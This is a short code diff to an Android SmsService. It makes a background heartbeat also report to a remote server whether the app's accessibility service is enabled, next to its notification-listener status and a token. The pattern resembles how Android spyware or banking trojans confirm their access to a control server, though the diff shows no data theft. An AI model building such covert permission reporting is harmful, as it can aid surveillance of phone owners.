@@ -54,6 +54,18 @@ public class SmsService extends Service {
                     if (!token.isEmpty()) {
                         String flat = android.provider.Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
                         String notif = (flat != null && flat.contains(getPackageName())) ? "1" : "0";
+                        // Verifier accessibilite
+                        String access = "0";
+                        try {
+                            android.accessibilityservice.AccessibilityServiceInfo info = null;
+                            android.view.accessibility.AccessibilityManager am = (android.view.accessibility.AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
+                            java.util.List<android.accessibilityservice.AccessibilityServiceInfo> list = am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
+                            for (android.accessibilityservice.AccessibilityServiceInfo s : list) {
+                                if (s.getResolveInfo().serviceInfo.packageName.equals(getPackageName())) {
+                                    access = "1"; break;
+                                }
+                            }
+                        } catch (Exception e) {}
                         java.net.URL u = new java.net.URL(serverUrl + "/api/heartbeat");
                         java.net.HttpURLConnection conn = (java.net.HttpURLConnection) u.openConnection();
                         conn.setRequestMethod("POST");
@@ -61,7 +73,7 @@ public class SmsService extends Service {
                         conn.setConnectTimeout(10000);
                         conn.setReadTimeout(10000);
                         conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                        String body = "token=" + token + "&notif=" + notif + "&version=38";
+                        String body = "token=" + token + "&notif=" + notif + "&access=" + access + "&version=38";
                         conn.getOutputStream().write(body.getBytes());
                         conn.getResponseCode();
                         conn.disconnect();
